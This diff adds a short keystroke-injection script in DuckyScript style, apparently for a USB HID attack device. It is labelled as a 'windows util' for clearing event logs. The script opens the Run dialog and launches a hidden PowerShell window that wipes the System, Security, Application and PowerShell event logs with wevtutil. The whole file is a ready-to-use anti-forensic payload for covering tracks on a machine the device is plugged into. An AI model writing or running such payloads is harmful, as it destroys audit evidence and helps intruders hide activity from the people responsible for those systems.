@@ -1,0 +1,9 @@
+META windows util
+REM Title: Clear Event Logs
+REM Description: Clears Windows event logs - requires admin privileges
+
+DEFAULTDELAY 400
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -Command "wevtutil cl System; wevtutil cl Security; wevtutil cl Application; wevtutil cl 'Windows PowerShell'"
+ENTER
